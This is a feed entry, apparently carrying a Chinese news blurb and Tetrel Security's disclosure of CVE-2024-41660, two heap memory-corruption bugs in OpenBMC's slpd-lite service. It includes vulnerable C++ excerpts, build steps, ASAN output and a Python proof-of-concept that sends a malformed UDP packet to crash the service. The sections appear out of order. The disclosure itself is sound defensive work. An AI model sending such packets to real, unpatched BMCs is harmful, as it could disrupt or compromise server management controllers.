+</span></span><span><span>  0x0c607fffa000: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fffa010: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>Shadow byte legend <span>(</span>one shadow byte represents <span>8</span> application bytes<span>)</span>:
+</span></span><span><span>  Addressable:           <span>00</span>
+</span></span><span><span>  Partially addressable: <span>01</span> <span>02</span> <span>03</span> <span>04</span> <span>05</span> <span>06</span> <span>07</span>
+</span></span><span><span>  Heap left redzone:       fa
+</span></span><span><span>  ...&lt;snip&gt;...
+</span></span></code></pre></div><p>The second vulnerability can instead be triggered by changing the Language Tag Length field to be the following in <code>poc.py</code>.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>b</span><span>'</span><span>\xfd\xe8</span><span>'</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span></code></pre></div>
+<h3>Technical Impact
+<span>
+<a href="#technical-impact" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Successful exploitation of this vulnerability would allow a network-resident (or remote attacker, depending upon the deployment) to fully compromise a BMC.</p>
+<h3>Exploitation Conditions
+<span>
+<a href="#exploitation-conditions" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>To exploit this vulnerability, an attacker would usually require access to the BMC management network.</p>
+<p>However, it is unfortunately common for integrators to expose their BMC network services to the internet, hence an argument for an elevated severity for this finding:</p>
+<ul>
+<li><a href="https://threatpost.com/ipmi-protocol-bmc-vulnerabilities-expose-thousands-of-servers-to-attack/101202/" target="_blank">Threatpost: <em>IPMI Protocol, BMC Vulnerabilities Expose Thousands of Servers to Attack</em></a></li>
+<li><a href="https://eclypsium.com/research/virtual-media-vulnerability-in-bmc-opens-servers-to-remote-attack/" target="_blank">Eclypsium: <em>Virtual Media Vulnerability in BMC Opens Servers to Remote Attack</em></a></li>
+<li><a href="https://isc.sans.edu/diary/28276" target="_blank">SANS Technology Institute: <em>Over 20 thousand servers have their iLO interfaces exposed to the internet…</em></a></li>
+</ul>
+<h2>Disclosure Timeline
+<span>
+<a href="#disclosure-timeline" aria-label="Anchor">#</a>
+</span>
+</h2>
+<ul>
+<li><strong>May 22, 2024</strong> - Tetrel reports issues to the OpenBMC’s security mailing list in the <a href="https://github.com/openbmc/docs/security" target="_blank">OpenBMC Security Policy</a></li>
+<li><strong>May 28, 2024</strong> - <em>slpd-lite</em> developers patch issues</li>
+<li><strong>July 29, 2024</strong> - OpenBMC <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">publishes advisory</a> and <a href="https://github.com/openbmc/openbmc/commit/350cb5f326d52aa7bb6c423e07fdaf26292f3541" target="_blank">applies patch</a> to the OpenBMC project</li>
+<li><strong>August 16, 2024</strong> - Tetrel publishes vulnerability details (this post)</li>
+</ul>
+<p>Thanks to <a href="https://github.com/geissonator" target="_blank">Andrew Geissler</a> and the OpenBMC Security Response Team for the rapid fix and advisory release!</p>
+<p><sup>ASPEED BMC Photo by <a href="https://commons.wikimedia.org/wiki/User:Phiarc" target="_blank">Phiarc</a>. CC BY-SA 4.0.</sup></p>
+</div>
+</div>
+</section>
+<footer>
+</footer>]]>
+    </description>
+    <content:encoded><![CDATA[Shawn the R0ck 写道：“
+Tetrel Security 公开了一个 SLPD-Lite 漏洞（CVE-2024-41660）的细节，slpd-lite 是 OpenBMC 的组件之一，此漏洞因为由 OpenBMC（部分OEM厂商实现）网络安全产生了严重的影响，因为它允许攻击者在易受攻击的系统上远程执行任意代码。
+<br>
+OpenBMC 是一个为服务器开发标准基板管理控制器（BMC）的标准实现框架。BMC允许对服务器硬件进行远程管理，广泛部署在服务器硬件中，提供监控、日志记录功能以及带外恢复和维护工具。由于BMC通常具有高度特权，因此将BMC网络接口隔离到一个独立的管理网络是安全最佳实践。
+<br>
+Tetrel在审查OpenBMC源代码时发现了slpd-lite子组件中的两个内存损坏漏洞。在典型部署中，成功利用这些漏洞将允许具有对BMC管理网络访问权限的攻击者完全攻陷BMC。
+<br>
+第一个漏洞涉及堆中分配的数据的越界读取，可能泄露信息给攻击者。第二个漏洞允许攻击者在堆中分配的数据结构范围之外进行写入。结合这两个漏洞，可以直接实现远程漏洞利用。Tetrel公开了漏洞成因，和相关技术细节，包括代码片段和漏洞的潜在利用方式。同时，还提供了有关如何确认堆损坏可能性的重现步骤，以及在Ubuntu 22.04.04 LTS上测试漏洞的过程。
+<br>
+如果你的数据中心使用了集成spld-lite的OEM厂商提供的BMC（无论是否基于OpenBMC)，务必尽快升级。HardenedVault的OpenBMC实现由于spld-lite并没有集成，所以不受影响。”
+<br>
+https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/<br /><hr />
+<p><a href="https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/" target="_blank">https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/</a></p>
+<header>
+<h1>
+CVE-2024-41660: A Critical Vulnerability in OpenBMC
+</h1>
+<div>
+<div>
+<time datetime="2024-08-16 00:00:00 +0000 UTC">16 August 2024</time>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jon.szymaniak">
+Jon Szymaniak
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jameson.hyde">
+Jameson Hyde
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/eric.evenchick">
+Eric Evenchick
+</a>
+<div>Managing Partner</div>
+<div>
+</div>
+</div>
+</div>
+</header>
+<section>
+<div>
+<div>
+<details open="">
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<details>
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+</div>
+</div>
+<div>
+<div>
+<p>The <a href="https://www.openbmc.org/" target="_blank">OpenBMC Project</a> is a community effort to develop a standard Baseboard Management Controller (BMC) for servers. BMCs allow for remote management of server hardware. They are widely deployed in server hardware to provide monitoring and logging features and tools for out-of-band recovery and maintenance. To allow for management of the server hardware, BMCs are typically highly privileged. As such, it is a security best practice to isolate BMC network interfaces to an isolated management network.</p>
+<p>During review of the <a href="https://github.com/openbmc" target="_blank">OpenBMC source code</a>, Tetrel discovered a critical vulnerability in the <a href="https://github.com/openbmc/slpd-lite" target="_blank">slpd-lite</a> sub-component. A <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">security advisory</a> has been issued for this vulnerability, and a CVSSv3.1 score of 9.8 / Critical has been assigned. The vulnerability has been assigned CVE ID <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41660" target="_blank">CVE-2024-41660</a>.</p>
+<p>The default OpenBMC build configuration <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/conf/distro/include/phosphor-base.inc#L106" target="_blank">installs</a> and <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/classes/obmc-phosphor-discovery-service.bbclass#L8" target="_blank">enables</a> the <em>slpd-lite</em> service. OpenBMC builds that do not explicitly disable the service will be vulnerable if the service is not updated to the patched version.</p>
+<h2>Technical Overview
+<span>
+<a href="#technical-overview" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>Within the <em>slpd-lite</em> network service running on the BMC, Tetrel identified two memory corruption vulnerabilities in the message handling code. In a typical deployment, successful exploitation of these vulnerabilities would allow an attacker with access to the BMC management network to fully compromise a BMC.</p>
+<h2>Technical Details
+<span>
+<a href="#technical-details" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>This finding pertains to the <a href="https://github.com/openbmc/slpd-lite" target="_blank">OpenBMC implementation of slpd-lite</a>. It was observed on the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/" target="_blank">most recent commit</a> at the time of writing.</p>
+<p>As shown in the abbreviated BMC console output below, a UDP-based <em>slpd</em> service runs as root and listens on port 427 (<em>svrloc</em>):</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>root@qemu:~# netstat -lup
+</span></span><span><span>Active Internet connections <span>(</span>only servers<span>)</span>
+</span></span><span><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span><span>udp6       <span>0</span>      <span>0</span> <span>[</span>::<span>]</span>:svrloc             <span>[</span>::<span>]</span>:*                              1280/slpd
+</span></span><span><span>
+</span></span><span><span>root@qemu:~# ps <span>|</span> grep slpd
+</span></span><span><span> <span>1280</span> root      <span>5516</span> S    /usr/sbin/slpd
+</span></span></code></pre></div>
+<h4>Vulnerability 1: Lack of Language Tag Length Validation Leads to OOB Heap Read
+<span>
+<a href="#vulnerability-1-lack-of-language-tag-length-validation-leads-to-oob-heap-read" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The first vulnerability is an out-of-bounds (OOB) read of heap-allocated data. This class of vulnerability has the potential to disclose information to an attacker, such as in-memory secrets or the addresses of code needed to exploit a separate OOB write.</p>
+<p>The following code excerpt illustrates how <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/sock_channel.cpp#L22" target="_blank"><code>udpsocket::Channel::read()</code></a> reads data into and resizes a <code>buffer</code> object (<a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L19" target="_blank">a <code>std::vector&lt;uint8_t&gt;</code></a>).</p>
+<p>Note that this buffer size is determined by how many bytes were received in the UDP datagram.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>buffer</span><span>&gt;</span> <span>Channel</span><span>::</span><span>read</span><span>()</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>int</span> <span>readSize</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>ssize_t</span> <span>readDataLen</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>buffer</span> <span>outBuffer</span><span>(</span><span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readSize</span><span>);</span>
+</span></span><span><span>    <span>auto</span> <span>bufferSize</span> <span>=</span> <span>outBuffer</span><span>.</span><span>size</span><span>();</span>
+</span></span><span><span>    <span>auto</span> <span>outputPtr</span> <span>=</span> <span>outBuffer</span><span>.</span><span>data</span><span>();</span>
+</span></span><span><span>
+</span></span><span><span>    <span>address</span><span>.</span><span>addrSize</span> <span>=</span> <span>static_cast</span><span>&lt;</span><span>socklen_t</span><span>&gt;</span><span>(</span><span>sizeof</span><span>(</span><span>address</span><span>.</span><span>inAddr</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>do</span>
+</span></span><span><span>    <span>{</span>
+</span></span><span><span>        <span>readDataLen</span> <span>=</span> <span>recvfrom</span><span>(</span><span>sockfd</span><span>,</span>             <span>// File Descriptor
+</span></span></span><span><span>                               <span>outputPtr</span><span>,</span>          <span>// Buffer
+</span></span></span><span><span>                               <span>bufferSize</span><span>,</span>         <span>// Bytes requested
+</span></span></span><span><span>                               <span>0</span><span>,</span>                  <span>// Flags
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>sockAddr</span><span>,</span>  <span>// Address
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>addrSize</span><span>);</span> <span>// Address Length
+</span></span></span><span><span>
+</span></span><span><span>        <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>}</span> <span>while</span> <span>((</span><span>readDataLen</span> <span>&lt;</span> <span>0</span><span>)</span> <span>&amp;&amp;</span> <span>(</span><span>-</span><span>(</span><span>rc</span><span>)</span> <span>==</span> <span>EINTR</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// Resize the vector to the actual data read from the socket
+</span></span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readDataLen</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>std</span><span>::</span><span>make_tuple</span><span>(</span><span>rc</span><span>,</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>outBuffer</span><span>));</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>The excerpt below contains part of the <code>parseHeader()</code> method, which creates and returns a <code>Message</code> object from the raw data <code>buffer</code> obtained by <code>udpsocket::Channel::read()</code> above. Observe that the 16-bit <code>langtagLen</code> variable assigned by extracting the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L30" target="_blank">Language Tag Length field</a> and then converting it to the host byte-order.</p>
+<p>Next, the code attempts to copy the Language Tag string from the raw data <code>buffer</code> into the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> string</a> (i.e. a string in the request <code>Message</code>’s <code>Header</code>).</p>
+<p>However, observe that in doing so, it fails to first confirm that the amount of remaining data in the raw <code>buffer</code> is actually <code>langtagLen</code> bytes.  Since this field is attacker controlled, it could be any value – including one that is much larger than the actual datagram size.</p>
+<p>The consequence of this missing check is that the <code>req.header.langtag</code> can be populated with not only the desired Language Tag string, but also arbitrary data that resides after <code>buff.data()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>Message</span><span>&gt;</span> <span>parseHeader</span><span>(</span><span>const</span> <span>buffer</span><span>&amp;</span> <span>buff</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>Message</span> <span>req</span><span>{};</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>slp</span><span>::</span><span>SUCCESS</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>uint16_t</span> <span>langtagLen</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>(</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG_LEN</span><span>,</span>
+</span></span><span><span>                <span>slp</span><span>::</span><span>header</span><span>::</span><span>SIZE_LANG</span><span>,</span> <span>(</span><span>uint8_t</span><span>*</span><span>)</span><span>&amp;</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>langtagLen</span> <span>=</span> <span>endian</span><span>::</span><span>from_network</span><span>(</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: Heap buffer overflow occurs here
+</span></span></span><span><span>    <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>insert</span><span>(</span>
+</span></span><span><span>        <span>0</span><span>,</span> <span>(</span><span>const</span> <span>char</span><span>*</span><span>)</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>,</span> <span>langtagLen</span><span>);</span>
+</span></span></code></pre></div><p>The call path to the affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>udpsocket</span><span>::</span><span>Channel</span><span>::</span><span>read</span> <span>// sock_channel.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>internal</span><span>::</span><span>parseHeader</span>
+</span></span></code></pre></div>
+<h4>Vulnerability 2: Unsigned Integer Wrap of (Unevaluated) Length Field Yields OOB Heap Write
+<span>
+<a href="#vulnerability-2-unsigned-integer-wrap-of-unevaluated-length-field-yields-oob-heap-write" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The second vulnerability allows an attacker to write outside the bounds of a heap-allocated data structure. Combined with the first vulnerability, this has potential to be exploited in practice.</p>
+<p>The code shown below is executed when the <em>slpd</em> server is preparing a response to either of the two request types supported by <em>slpd-lite</em>.</p>
+<p>First, make note of the computation of the <code>uint8_t length</code> variable. Here, an <a href="https://wiki.sei.cmu.edu/confluence/display/c/INT30-C.+Ensure+that+unsigned+integer+operations+do+not+wrap" target="_blank">unsigned integer wrap</a> can occur because <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> is actually a <code>std::string</code></a>. The return value of <code>std::string::length()</code> is a <code>size_t</code>. The actual length of this string is determined by a <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L56-L64" target="_blank"><code>uint16_t</code> length field in the original request</a> during a preceding call to <code>slp::parser::parseBuffer</code>.</p>
+<p>Thus, a 16-bit unsigned value (in a <code>size_t</code>) is added two other values, and then truncated to an unsigned 8-bit value. For many possible length values, the resulting 8-bit value is smaller than that returned by <code>req.header.langtag.length()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>buffer</span> <span>prepareHeader</span><span>(</span><span>const</span> <span>Message</span><span>&amp;</span> <span>req</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>uint8_t</span> <span>length</span> <span>=</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>header</span><span>::</span><span>MIN_LEN</span> <span>+</span>        <span>/* 14 bytes for header     */</span>
+</span></span><span><span>        <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>()</span> <span>+</span> <span>/* Actual length of lang tag */</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>response</span><span>::</span><span>SIZE_ERROR</span><span>;</span>    <span>/*  2 bytes for error code */</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buffer</span> <span>buff</span><span>(</span><span>length</span><span>,</span> <span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buff</span><span>[</span><span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_VERSION</span><span>]</span> <span>=</span> <span>req</span><span>.</span><span>header</span><span>.</span><span>version</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>// tetrel: OOB heap buffer write occurs here
+</span></span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>((</span><span>uint8_t</span><span>*</span><span>)</span><span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>c_str</span><span>(),</span>
+</span></span><span><span>                <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>(),</span>
+</span></span><span><span>                <span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>buff</span><span>;</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>Next, observe that a zero-filled <code>buffer</code> is allocated with a size argument specified via the 8-bit <code>length</code> value.</p>
+<p>At the end of <code>prepareHeader()</code>, the code attempts to copy the Language Tag from the request header into the response header. However, it does so with <strong>the actual <code>size_t</code> string length</strong>, which can be up to 65535 bytes. The inherent UDP datagram length limits this maximum value to be somewhat smaller. However, it still can be much larger than 255 bytes which will result in an overflow.</p>
+<p>As a result, the <code>std::copy_n()</code> write overflows the heap-allocated buffer and corrupts nearby memory. Exploiting heap corruption is <a href="https://github.com/shellphish/how2heap" target="_blank">well-studied</a> and has potential for an attacker to achieve arbitrary code execution.</p>
+<p>The call path to this affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp - Convert raw data buffer to a Message object
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>processRequest</span> <span>// slp_message_handler.cpp - Process Message, top-level
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvTypeRequest</span> <span>// Process Service Type Request
+</span></span></span><span><span>        <span>OR</span>
+</span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvRequest</span> <span>-</span> <span>Process</span> <span>Service</span> <span>Request</span>
+</span></span><span><span>            <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>prepareHeader</span> <span>-</span> <span>Prepare</span> <span>response</span> <span>buffer</span>
+</span></span></code></pre></div>
+<h3>Reproduction Steps
+<span>
+<a href="#reproduction-steps" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Below is the process used by Tetrel to confirm that heap corruption is possible. This procedure has been tested on Ubuntu 22.04.04 LTS.</p>
+<h4>1. Install dependencies, if necessary
+<span>
+<a href="#1-install-dependencies-if-necessary" aria-label="Anchor">#</a>
+</span>
+</h4>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt install build-essential libsystemd-dev meson clang-15 lld-15
+</span></span></code></pre></div>
+<h4>2. Download and Compile slpd-lite with Address Sanitizer (ASAN)
+<span>
+<a href="#2-download-and-compile-slpd-lite-with-address-sanitizer-asan" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The following commands demonstrate how to check out the version of slpd-lite specified in the <code>slpd-lite_git.bb</code> Yocto recipe.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>git clone https://github.com/openbmc/slpd-lite
+</span></span><span><span><span>cd</span> slpd-lite
+</span></span><span><span>git checkout 55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4
+</span></span></code></pre></div><p>In order to quickly perform a test without needing to run the vulnerable code as root, edit line 9 of <code>slp_meta.hpp</code> to change the listening port number from 427 to 4427:</p>
+<div><pre tabindex="0"><code data-lang="CPP"><span><span><span>constexpr</span> <span>auto</span> <span>PORT</span> <span>=</span> <span>4427</span><span>;</span>
+</span></span></code></pre></div><p>Next, setup up the build environment, compile, and run the <code>slpd</code> binary:</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>CC</span><span>=</span>clang-15 <span>CXX</span><span>=</span>clang++-15 <span>CC_LD</span><span>=</span>lld-15 <span>CXX_LD</span><span>=</span>lld-15 <span>LDFLAGS</span><span>=</span>-lasan <span>\
+</span></span></span><span><span>    meson setup build -Db_sanitize<span>=</span>address -Db_lundef<span>=</span><span>false</span>
+</span></span><span><span><span>cd</span> build
+</span></span><span><span>meson compile
+</span></span><span><span>./slpd
+</span></span></code></pre></div>
+<h4>3. Create and Run Proof-of-Concept Client
+<span>
+<a href="#3-create-and-run-proof-of-concept-client" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Copy the following Python script to a <code>poc.py</code> file and run it. Note that this is written to connect to the server on port 4427, rather than the default 427.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>#!/usr/bin/env python3</span>
+</span></span><span><span><span>from</span> <span>socket</span> <span>import</span> <span>*</span>
+</span></span><span><span>
+</span></span><span><span><span>sock</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_DGRAM</span><span>)</span>
+</span></span><span><span><span>addr</span> <span>=</span> <span>(</span><span>"127.0.0.1"</span><span>,</span> <span>4427</span><span>)</span>
+</span></span><span><span><span>payload</span> <span>=</span> <span>(</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x02</span><span>'</span> <span>+</span>      <span># Version</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x09</span><span>'</span> <span>+</span>      <span># Function ID: SRVTYPERQST</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Ignored Length bytes?</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>+</span>      <span># Length</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Flags</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>3</span> <span>+</span>  <span># Ext</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># XID</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span><span><span>        <span>b</span><span>'A'</span> <span>*</span> <span>65000</span>   <span># Language Tag</span>
+</span></span><span><span><span>)</span>
+</span></span><span><span><span>sock</span><span>.</span><span>sendto</span><span>(</span><span>payload</span><span>,</span> <span>addr</span><span>)</span>
+</span></span></code></pre></div>
+<h4>4. Observe Heap Corruption in the ASAN Report
+<span>
+<a href="#4-observe-heap-corruption-in-the-asan-report" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Observed that the <code>slpd</code> process crashes and an ASAN report is generated. An example is provided below, which demonstrates that the first vulnerability documented in this finding has been triggered.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>==</span><span>17145</span><span>==</span>ERROR: AddressSanitizer: heap-buffer-overflow on address 0x63000000fe0e at pc 0x5c87b6c78f47 ...
+</span></span><span><span>READ of size <span>65535</span> at 0x63000000fe0e thread T0
+</span></span><span><span>    <span>#0 0x5c87b6c78f46 in __asan_memcpy (build/slpd+0xe5f46) </span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x642f6e4d79a0 in std::__cxx11::basic_string&lt;...&gt;::insert(...) .../bits/basic_string.h:1707:22</span>
+</span></span><span><span>    <span>#7 0x5c87b6ccdc5b in slp::parser::internal::parseHeader(...) slp_parser.cpp:63:24</span>
+</span></span><span><span>    <span>#8 0x5c87b6ccf40c in slp::parser::parseBuffer(...) slp_parser.cpp:240:25</span>
+</span></span><span><span>    <span>#9 0x5c87b6cb6ca1 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:33:33</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>
+</span></span><span><span>0x63000000fe0e is located <span>0</span> bytes to the right of 64014-byte region <span>[</span>0x630000000400,0x63000000fe0e<span>)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#0 0x5c87b6cb3e9d in operator new(unsigned long) (slpd+0x120e9d)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x5c87b6cbf5b5 in std::vector&lt;...&gt;::resize(unsigned long) include/c++/11/bits/stl_vector.h:940:4</span>
+</span></span><span><span>    <span>#7 0x5c87b6cd25fd in udpsocket::Channel::read() sock_channel.cpp:36:15</span>
+</span></span><span><span>    <span>#8 0x5c87b6cb69f9 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:20:38</span>
+</span></span><span><span>    <span>#9 0x72f3ba3a5668  (/lib/x86_64-linux-gnu/libsystemd.so.0+0x73668) </span>
+</span></span><span><span>
+</span></span><span><span>SUMMARY: AddressSanitizer: heap-buffer-overflow <span>(</span>slpd+0xe5f46<span>)</span> in __asan_memcpy
+</span></span><span><span>Shadow bytes around the buggy address:
+</span></span><span><span>  0x0c607fff9f70: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
